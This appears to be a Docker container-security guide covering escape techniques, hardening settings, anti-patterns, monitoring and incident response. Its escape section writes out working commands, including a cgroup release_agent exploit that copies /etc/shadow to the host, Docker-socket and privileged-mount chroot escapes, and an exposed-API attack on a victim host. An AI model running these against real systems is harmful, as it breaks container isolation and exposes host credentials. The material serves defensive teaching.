# Docker Security Guide: Container Escapes and Best Practices

## Table of Contents
1. [Introduction](#introduction)
2. [Automated Security Tools](#automated-security-tools)
3. [Common Docker Escape Techniques](#common-docker-escape-techniques)
4. [Security Best Practices - What TO DO](#security-best-practices---what-to-do)
5. [Security Anti-Patterns - What NOT TO DO](#security-anti-patterns---what-not-to-do)
6. [Detection and Monitoring](#detection-and-monitoring)
7. [Incident Response](#incident-response)

---

## Introduction

Docker containers provide isolation through Linux namespaces, cgroups, and capabilities. However, misconfigurations and vulnerabilities can allow attackers to escape containers and compromise the host system. This guide covers common exploitation techniques and defensive measures.

**Target Audience**: DevOps engineers, security teams, and developers deploying containerized applications.

---

## Automated Security Tools

This guide includes automated security tools located in the `SECURITY-DOCKER/` directory to help you implement and verify security best practices.

### 1. Docker Security Audit Script

**`docker-security-audit.sh`** - Comprehensive security auditing tool that checks running containers and Docker daemon configuration.

#### Features:
- ✅ Audits all security checklist items automatically
- ✅ Checks container configurations (user, capabilities, privileges, etc.)
- ✅ Validates Docker daemon security settings
- ✅ Scans images for vulnerabilities (if Trivy is installed)
- ✅ Provides detailed remediation guidance
- ✅ Calculates overall security score

#### Usage:

```bash
# Navigate to tools directory
cd SECURITY-DOCKER/

# Audit all running containers
./docker-security-audit.sh

# Audit specific container
./docker-security-audit.sh --container my-container

# Show daemon configuration fixes
./docker-security-audit.sh --fix-daemon
```

#### Example Output:

```
============================================
Docker Security Audit
============================================
Date: Mon Nov 24 12:00:00 UTC 2025
Docker Version: 24.0.7

[PASS] User namespace remapping is configured
[FAIL] Container web-app is running as root
         Fix: Add 'USER <non-root-user>' to Dockerfile
[PASS] Container web-app is not privileged
[WARN] Container web-app has not dropped any capabilities
         Recommendation: Use --cap-drop=ALL

============================================
Audit Summary
============================================
Passed:  15
Failed:  3
Warnings: 7
Info:    2

Security Score: 68%
Status: NEEDS IMPROVEMENT
```

---

### 2. Docker Secure Run Script

**`docker-secure-run.sh`** - Helper script to run containers with security best practices automatically applied.

#### Features:
- ✅ Enforces non-root user requirement
- ✅ Automatically drops all capabilities
- ✅ Applies resource limits (memory, CPU, PIDs)
- ✅ Enables read-only root filesystem by default
- ✅ Configures security options (AppArmor, Seccomp, no-new-privileges)
- ✅ Creates isolated network
- ✅ Blocks dangerous configurations (sensitive host mounts, :latest tags)
- ✅ Validates image security before running

#### Usage:

```bash
# Navigate to tools directory
cd SECURITY-DOCKER/

# Run container with security defaults
./docker-secure-run.sh nginx:1.25

# Run with custom memory limit
./docker-secure-run.sh --memory 1g nginx:1.25

# Run detached with port mapping
./docker-secure-run.sh -d -p 8080:80 --name web nginx:1.25

# Run with writable filesystem (when needed)
./docker-secure-run.sh --writable myapp:1.0

# Run with additional capability
./docker-secure-run.sh --cap-add NET_BIND_SERVICE myapp:1.0

# Show all options
./docker-secure-run.sh --help
```

#### What Gets Applied Automatically:

| Security Control | Default Setting | Override Flag |
|-----------------|----------------|---------------|
| Drop capabilities | `--cap-drop=ALL` | `--cap-add <cap>` |
| Read-only filesystem | `--read-only` | `--writable` |
| Memory limit | `512m` | `--memory <size>` |
| CPU limit | `1.0` | `--cpus <number>` |
| PID limit | `100` | `--pids-limit <n>` |
| No new privileges | `yes` | `--allow-new-privs` |
| AppArmor | `docker-default` | N/A |
| Network isolation | `secure-isolated` | `--host-network` |
| Non-root check | `enforced` | `--allow-root` |

#### Example Output:

```
================================
Docker Secure Run
================================

[INFO] Checking if image exists: nginx:1.25
[INFO] Image runs as user: nginx
[INFO] Dropping all capabilities
[INFO] Enabling read-only root filesystem
[INFO] Applying resource limits: memory=512m, cpus=1.0, pids=100
[INFO] Enabling security options: no-new-privileges, apparmor
[INFO] Creating isolated network: secure-isolated

Executing secure container:
docker run --cap-drop=ALL --read-only --tmpfs /tmp:rw,noexec,nosuid,size=64m --tmpfs /var/tmp:rw,noexec,nosuid,size=64m --memory=512m --memory-swap=512m --cpus=1.0 --pids-limit=100 --security-opt=no-new-privileges:true --security-opt=apparmor=docker-default --network=secure-isolated nginx:1.25

a1b2c3d4e5f6...
```

---

### Quick Start with Tools

**Step 1**: Audit your current containers
```bash
cd SECURITY-DOCKER/
./docker-security-audit.sh
```

**Step 2**: Review the audit results and security score

**Step 3**: Use the secure-run script for new deployments
```bash
./docker-secure-run.sh your-image:version
```

**Step 4**: Integrate into your workflow
```bash
# Add to your deployment scripts
alias docker-run='./SECURITY-DOCKER/docker-secure-run.sh'

# Add audit to CI/CD pipeline
./SECURITY-DOCKER/docker-security-audit.sh || exit 1
```

---

### CI/CD Integration

#### GitLab CI Example:
```yaml
security-audit:
  stage: test
  script:
    - ./SECURITY-DOCKER/docker-security-audit.sh
  allow_failure: false

deploy:
  stage: deploy
  script:
    - ./SECURITY-DOCKER/docker-secure-run.sh -d myapp:${CI_COMMIT_TAG}
```

#### GitHub Actions Example:
```yaml
name: Docker Security Audit

on: [push, pull_request]

jobs:
  security-audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Run Security Audit
        run: |
          chmod +x SECURITY-DOCKER/docker-security-audit.sh
          ./SECURITY-DOCKER/docker-security-audit.sh
```

#### Jenkins Pipeline Example:
```groovy
pipeline {
    agent any
    stages {
        stage('Security Audit') {
            steps {
                sh './SECURITY-DOCKER/docker-security-audit.sh'
            }
        }
        stage('Deploy') {
            steps {
                sh './SECURITY-DOCKER/docker-secure-run.sh -d myapp:${BUILD_TAG}'
            }
        }
    }
}
```

---

### Tool Requirements

**Both scripts require:**
- Docker installed and running
- Bash 4.0 or higher
- Sufficient permissions to run Docker commands

**Optional but recommended:**
- [Trivy](https://github.com/aquasecurity/trivy) for vulnerability scanning
- Root/sudo access for daemon configuration checks

**Installation:**
```bash
# Install Trivy (for vulnerability scanning)
# macOS
brew install trivy

# Linux
curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin

# Make scripts executable (if needed)
chmod +x SECURITY-DOCKER/*.sh
```

---

## Common Docker Escape Techniques

### 1. Privileged Container Escape

**Vulnerability**: Running containers with `--privileged` flag grants all capabilities and removes isolation.

**Exploitation Method**:
```bash
# Inside privileged container
mkdir /tmp/mount
mount /dev/sda1 /tmp/mount
# Attacker now has full access to host filesystem
chroot /tmp/mount /bin/bash
# Full host access achieved
```

**Why It Works**: Privileged mode disables security features and grants access to all devices.

---

### 2. Docker Socket Mount Escape

**Vulnerability**: Mounting `/var/run/docker.sock` inside container.

**Exploitation Method**:
```bash
# Inside container with docker.sock mounted
# Install docker client if not present
curl -fsSL https://get.docker.com -o get-docker.sh
sh get-docker.sh

# Launch privileged container
docker run -v /:/host -it ubuntu chroot /host /bin/bash
# Full host access achieved
```

**Why It Works**: Docker socket access allows container creation with any permissions, including host filesystem mounts.

---

### 3. Capability-Based Escapes

**Vulnerability**: Excessive Linux capabilities granted to containers.

#### CAP_SYS_ADMIN Escape:
```bash
# Inside container with CAP_SYS_ADMIN
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Execute command on host
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd

# Trigger execution
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

**Why It Works**: CAP_SYS_ADMIN allows cgroup manipulation, enabling arbitrary command execution on the host.

#### CAP_SYS_PTRACE Escape:
```bash
# Attach to host process from container
gdb -p 1
# Can inject shellcode or manipulate host processes
```

#### CAP_DAC_READ_SEARCH Escape:
```bash
# Bypass file permission checks
# Can read any file on host including secrets
```

---

### 4. Kernel Exploits

**Vulnerability**: Containers share the host kernel. Kernel vulnerabilities affect all containers.

**Notable Examples**:
- **Dirty COW (CVE-2016-5195)**: Memory corruption leading to privilege escalation
- **Dirty Pipe (CVE-2022-0847)**: Overwrite read-only files
- **Netfilter (CVE-2021-22555)**: Heap overflow for privilege escalation

**Exploitation**: Use kernel exploits from within container to gain root on host.

```bash
# Generic approach
# 1. Identify kernel version
uname -a

# 2. Search for exploits
# 3. Compile and execute exploit
# 4. Gain root on host
```

---

### 5. Container Breakout via /proc

**Vulnerability**: Exposed /proc filesystem with insufficient isolation.

**Exploitation Method**:
```bash
# Inside container
# Access host process information
cat /proc/1/environ
cat /proc/1/cmdline

# In some misconfigurations, can write to /proc/sys
echo "kernel.core_pattern=|/tmp/exploit.sh" > /proc/sys/kernel/core_pattern
```

---

### 6. Misconfigured User Namespaces

**Vulnerability**: User namespace mapping allowing root inside container to map to privileged user outside.

**Exploitation**:
```bash
# If user namespace is misconfigured
# Root in container might have real privileges
# Check effective capabilities
capsh --print

# Access host resources based on UID mapping
```

---

### 7. Container Image Vulnerabilities

**Vulnerability**: Malicious or vulnerable base images, supply chain attacks.

**Exploitation**:
- Backdoored images with embedded malware
- Images with known CVEs
- Cryptocurrency miners
- Credential stealers

---

### 8. Runtime Escapes (runC vulnerabilities)

**Notable Example - CVE-2019-5736**:
```bash
# Exploit allows overwriting runC binary on host
# When container is executed, attacker gains host access
# Affects older Docker versions
```

---

### 9. Exposed Docker API

**Vulnerability**: Docker daemon exposed over network without authentication.

**Exploitation**:
```bash
# From attacker machine
docker -H tcp://victim-ip:2375 run -v /:/host -it ubuntu chroot /host /bin/bash
```

---

### 10. Kubernetes-Specific Escapes

**Vulnerability**: Misconfigured Kubernetes security contexts.

**Exploitation**:
```yaml
# Pod with hostPath volume
apiVersion: v1
kind: Pod
spec:
  containers:
  - name: attacker
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
```

---

## Security Best Practices - What TO DO

### 1. Run Containers as Non-Root

```dockerfile
# In Dockerfile
FROM ubuntu:22.04

# Create non-root user
RUN groupadd -r appuser && useradd -r -g appuser appuser

# Switch to non-root user
USER appuser

# Application runs as appuser
CMD ["./app"]
```

**Benefits**: Limits damage if container is compromised.

---

### 2. Use Security Profiles

#### AppArmor Profile:
```bash
# Run with AppArmor profile
docker run --security-opt apparmor=docker-default myimage
```

#### Seccomp Profile:
```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": [
    "SCMP_ARCH_X86_64"
  ],
  "syscalls": [
    {
      "names": [
        "read",
        "write",
        "exit",
        "exit_group"
      ],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
```

```bash
docker run --security-opt seccomp=profile.json myimage
```

---

### 3. Drop Unnecessary Capabilities

```bash
# Drop all capabilities, add only required ones
docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE myimage
```

```yaml
# In Kubernetes
apiVersion: v1
kind: Pod
spec:
  containers:
  - name: myapp
    securityContext:
      capabilities:
        drop:
        - ALL
        add:
        - NET_BIND_SERVICE
```

---

### 4. Use Read-Only Root Filesystem

```bash
docker run --read-only --tmpfs /tmp myimage
```

```dockerfile
# In Kubernetes
securityContext:
  readOnlyRootFilesystem: true
```

**Benefits**: Prevents attackers from modifying binaries or dropping malware.

---

### 5. Implement Resource Limits

```bash
docker run \
  --memory="512m" \
  --memory-swap="512m" \
  --cpus="1.5" \
  --pids-limit=100 \
  myimage
```

**Benefits**: Prevents resource exhaustion attacks.

---

### 6. Network Segmentation

```bash
# Create isolated network
docker network create --driver bridge isolated_net

# Run containers on isolated network
docker run --network=isolated_net myimage
```

**Benefits**: Limits lateral movement.

---

### 7. Image Security Scanning

```bash
# Scan images for vulnerabilities
docker scan myimage:latest

# Or use Trivy
trivy image myimage:latest

# Or Clair, Anchore, Snyk
```

---

### 8. Content Trust and Image Signing

```bash
# Enable Docker Content Trust
export DOCKER_CONTENT_TRUST=1

# Sign images
docker trust sign myimage:latest

# Verify signatures before pulling
docker pull myimage:latest
```

---

### 9. Minimal Base Images

```dockerfile
# Use distroless or minimal images
FROM gcr.io/distroless/static-debian11

# Or Alpine
FROM alpine:3.18

# Multi-stage builds to reduce attack surface
FROM golang:1.21 AS builder
WORKDIR /app
COPY . .
RUN go build -o myapp

FROM gcr.io/distroless/base-debian11
COPY --from=builder /app/myapp /
CMD ["/myapp"]
```

---

### 10. Regular Updates and Patching

```bash
# Regularly rebuild images with latest patches
docker build --no-cache -t myimage:latest .

# Automate with CI/CD
# Use tools like Renovate or Dependabot for dependency updates
```

---

### 11. Runtime Security Monitoring

**Tools**:
- **Falco**: Runtime security monitoring
- **Sysdig**: Container security platform
- **Aqua Security**: Container security
- **StackRox/ACS**: Kubernetes security

**Example Falco Rule**:
```yaml
- rule: Terminal shell in container
  desc: A shell was spawned in a container
  condition: >
    spawned_process and container and
    shell_procs and proc.tty != 0
  output: >
    Shell spawned in container
    (user=%user.name container=%container.name
    shell=%proc.name parent=%proc.pname)
  priority: WARNING
```

---

### 12. Secure Docker Daemon Configuration

```json
// /etc/docker/daemon.json
{
  "icc": false,
  "log-level": "info",
  "userns-remap": "default",
  "no-new-privileges": true,
  "live-restore": true,
  "userland-proxy": false,
  "default-ulimits": {
    "nofile": {
      "Name": "nofile",
      "Hard": 64000,
      "Soft": 64000
    }
  }
}
```

---

### 13. Enable User Namespace Remapping

```bash
# Enable user namespace remapping
echo "dockremap:165536:65536" >> /etc/subuid
echo "dockremap:165536:65536" >> /etc/subgid

# Configure daemon
{
  "userns-remap": "default"
}
```

**Benefits**: Root inside container is unprivileged user on host.

---

### 14. Implement Pod Security Standards (Kubernetes)

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
```

---

### 15. Secrets Management

```bash
# Use Docker secrets (Swarm)
echo "db_password" | docker secret create db_pass -

# Use in service
docker service create \
  --secret db_pass \
  myimage

# Or use external secrets managers
# - HashiCorp Vault
# - AWS Secrets Manager
# - Azure Key Vault
# - Kubernetes Secrets with encryption
```

---

## Security Anti-Patterns - What NOT TO DO

### ❌ 1. DO NOT Run Privileged Containers

```bash
# NEVER DO THIS in production
docker run --privileged myimage
```

**Why**: Grants all capabilities, disables security features, allows device access.

---

### ❌ 2. DO NOT Mount Docker Socket

```bash
# AVOID THIS
docker run -v /var/run/docker.sock:/var/run/docker.sock myimage
```

**Why**: Grants full Docker API access, equivalent to root on host.

**Alternative**: Use Docker-in-Docker (dind) with proper isolation or rootless Docker.

---

### ❌ 3. DO NOT Use :latest Tag in Production

```dockerfile
# BAD
FROM ubuntu:latest

# GOOD
FROM ubuntu:22.04
```

**Why**: Lack of reproducibility, potential for unexpected updates.

---

### ❌ 4. DO NOT Store Secrets in Images

```dockerfile
# NEVER DO THIS
ENV API_KEY="secret_key_12345"
ENV DB_PASSWORD="password123"

# BAD - Still visible in image layers
RUN echo "password" > /config/secret && \
    use_secret && \
    rm /config/secret
```

**Why**: Secrets remain in image layers and can be extracted.

---

### ❌ 5. DO NOT Run Containers as Root

```dockerfile
# AVOID THIS
FROM ubuntu:22.04
# No USER directive means root

# ALSO BAD
USER root
```

**Why**: Increases attack surface and potential damage.

---

### ❌ 6. DO NOT Disable Security Features

```bash
# DANGEROUS
docker run --security-opt seccomp=unconfined \
  --security-opt apparmor=unconfined \
  --cap-add=ALL \
  myimage
```

**Why**: Removes security boundaries.

---

### ❌ 7. DO NOT Mount Host Paths Without Restrictions

```bash
# DANGEROUS
docker run -v /:/host myimage
docker run -v /etc:/host-etc myimage
docker run -v /var/run:/var/run myimage
```

**Why**: Provides access to sensitive host files and resources.

---

### ❌ 8. DO NOT Use --net=host

```bash
# AVOID
docker run --net=host myimage
```

**Why**: Removes network isolation, container shares host network namespace.

---

### ❌ 9. DO NOT Expose Docker Daemon Without TLS

```bash
# NEVER DO THIS
dockerd -H tcp://0.0.0.0:2375
```

**Why**: Unauthenticated remote access to Docker daemon.

---

### ❌ 10. DO NOT Ignore Image Vulnerabilities

```bash
# BAD PRACTICE
# Ignoring scan results and deploying anyway

# GOOD PRACTICE
# Fail CI/CD pipeline on high/critical vulnerabilities
```

---

### ❌ 11. DO NOT Use Untrusted Base Images

```dockerfile
# RISKY
FROM randomuser/suspicious-image:latest

# BETTER
FROM ubuntu:22.04
FROM gcr.io/distroless/base
```

**Why**: Supply chain attacks, backdoors, malware.

---

### ❌ 12. DO NOT Run Multiple Services in One Container

```dockerfile
# ANTI-PATTERN
CMD service nginx start && service mysql start && service app start
```

**Why**: Violates single responsibility principle, complicates security and monitoring.

---

### ❌ 13. DO NOT Use Default Passwords/Credentials

```dockerfile
# BAD
ENV MYSQL_ROOT_PASSWORD=root
ENV ADMIN_USER=admin
ENV ADMIN_PASS=admin
```

**Why**: Easily exploitable, commonly targeted by attackers.

---

### ❌ 14. DO NOT Leave Debug/Development Tools in Production

```dockerfile
# BAD for production
RUN apt-get install -y gcc make gdb strace curl wget netcat
```

**Why**: Provides tools for attackers to exploit and pivot.

---

### ❌ 15. DO NOT Trust Container Isolation Alone

**Bad Assumption**: "Containers are secure by default"

**Reality**: Containers share the kernel and require proper configuration for security.

**Best Practice**: Defense in depth - multiple security layers.

---

## Detection and Monitoring

### Signs of Container Compromise

1. **Unexpected processes**:
```bash
docker top <container_id>
# Look for shells, crypto miners, scanners
```

2. **Unusual network activity**:
```bash
# Monitor connections
docker exec <container_id> netstat -antp
```

3. **Resource spikes**:
```bash
docker stats
# Monitor CPU, memory, network usage
```

4. **File system changes**:
```bash
docker diff <container_id>
# Shows modified files
```

---

### Logging and Auditing

```bash
# Enable Docker audit logging
auditctl -w /usr/bin/docker -k docker
auditctl -w /var/lib/docker -k docker
auditctl -w /etc/docker -k docker

# Centralized logging
docker run --log-driver=syslog \
  --log-opt syslog-address=tcp://logserver:514 \
  myimage
```

---

### Security Tools

| Tool | Purpose |
|------|---------|
| Falco | Runtime threat detection |
| Trivy | Vulnerability scanning |
| Clair | Container vulnerability analysis |
| Docker Bench Security | CIS benchmark checker |
| Anchore | Container security analysis |
| Aqua Security | Container security platform |
| Sysdig | Container monitoring & security |
| Twistlock/Prisma Cloud | Container security |

---

## Incident Response

### 1. Isolation
```bash
# Immediately disconnect compromised container
docker network disconnect bridge <container_id>

# Or stop the container
docker stop <container_id>
```

### 2. Evidence Collection
```bash
# Export container filesystem
docker export <container_id> > compromised-container.tar

# Save logs
docker logs <container_id> > container-logs.txt

# Get container details
docker inspect <container_id> > container-inspect.json
```

### 3. Analysis
- Review logs for initial access vector
- Check running processes
- Analyze network connections
- Examine file modifications
- Review parent image for vulnerabilities

### 4. Remediation
- Patch vulnerabilities
- Update base images
- Review and harden configurations
- Implement additional controls
- Update security policies

### 5. Recovery
- Deploy patched containers
- Restore from known good images
- Verify integrity
- Monitor for reinfection

---

## Quick Security Checklist

> **💡 TIP**: Use `SECURITY-DOCKER/docker-security-audit.sh` to automatically verify these items!

### Container Configuration
- [ ] Containers run as non-root users
  - *Verified by: audit script*
  - *Enforced by: secure-run script*
- [ ] Read-only root filesystem enabled where possible
  - *Verified by: audit script*
  - *Enforced by: secure-run script (default)*
- [ ] Unnecessary capabilities dropped
  - *Verified by: audit script*
  - *Enforced by: secure-run script (--cap-drop=ALL)*
- [ ] Resource limits configured
  - *Verified by: audit script*
  - *Enforced by: secure-run script (memory, CPU, PIDs)*
- [ ] No privileged containers in production
  - *Verified by: audit script*
  - *Blocked by: secure-run script*
- [ ] Docker socket not mounted in containers
  - *Verified by: audit script*
  - *Blocked by: secure-run script*
- [ ] Security profiles (AppArmor/Seccomp) enabled
  - *Verified by: audit script*
  - *Enforced by: secure-run script*
- [ ] Network segmentation implemented
  - *Verified by: audit script*
  - *Enforced by: secure-run script (isolated network)*

### Image Security
- [ ] Images scanned for vulnerabilities
  - *Verified by: audit script (with Trivy)*
- [ ] Using specific image tags (not :latest)
  - *Verified by: audit script*
  - *Warned by: secure-run script*
- [ ] Secrets not stored in images
  - *Manual review required*
- [ ] Minimal base images used
  - *Manual review required*
- [ ] Multi-stage builds for production images
  - *Manual review required*
- [ ] Content trust and image signing enabled
  - *Manual configuration required*

### Daemon & System
- [ ] User namespace remapping enabled
  - *Verified by: audit script*
  - *Configuration help: audit script --fix-daemon*
- [ ] Docker daemon properly secured
  - *Verified by: audit script*
  - *Configuration help: audit script --fix-daemon*
- [ ] Audit logging enabled
  - *Manual configuration required*

### Operations
- [ ] Runtime security monitoring active
  - *Use: Falco, Sysdig, or similar tools*
- [ ] Regular security updates and patching
  - *Manual process + automation*
- [ ] Pod Security Standards enforced (Kubernetes)
  - *Kubernetes-specific configuration*

### Using the Automated Tools

**Run full audit:**
```bash
cd SECURITY-DOCKER/
./docker-security-audit.sh
```

**Deploy containers securely:**
```bash
cd SECURITY-DOCKER/
./docker-secure-run.sh -d -p 8080:80 myapp:1.0
```

**Get daemon fixes:**
```bash
cd SECURITY-DOCKER/
./docker-security-audit.sh --fix-daemon
```

---

## References and Resources

### Official Documentation
- [Docker Security](https://docs.docker.com/engine/security/)
- [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker)
- [Kubernetes Security](https://kubernetes.io/docs/concepts/security/)
- [NIST Application Container Security Guide](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-190.pdf)

### Security Tools
- [Docker Bench Security](https://github.com/docker/docker-bench-security)
- [Falco](https://falco.org/)
- [Trivy](https://github.com/aquasecurity/trivy)
- [Hadolint](https://github.com/hadolint/hadolint) - Dockerfile linter

### Learning Resources
- [Container Security Book by Liz Rice](https://www.oreilly.com/library/view/container-security/9781492056690/)
- [OWASP Docker Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)

---

## Conclusion

Container security requires a defense-in-depth approach combining:
- Secure configuration
- Least privilege principles
- Runtime monitoring
- Regular updates
- Security scanning
- Network segmentation
- Proper secrets management

**Remember**: Containers are NOT a security boundary by themselves. Proper configuration and multiple layers of security controls are essential for protecting containerized applications and the underlying infrastructure.

---

**Document Version**: 2.0
**Last Updated**: 2025-11-24
**Maintained By**: Security Team

---

## Tools Directory

All automated security tools are located in `SECURITY-DOCKER/`:
- `docker-security-audit.sh` - Comprehensive security audit script
- `docker-secure-run.sh` - Secure container deployment wrapper
- `README.md` - Detailed tools documentation

For complete tool documentation, see [SECURITY-DOCKER/README.md](SECURITY-DOCKER/README.md)
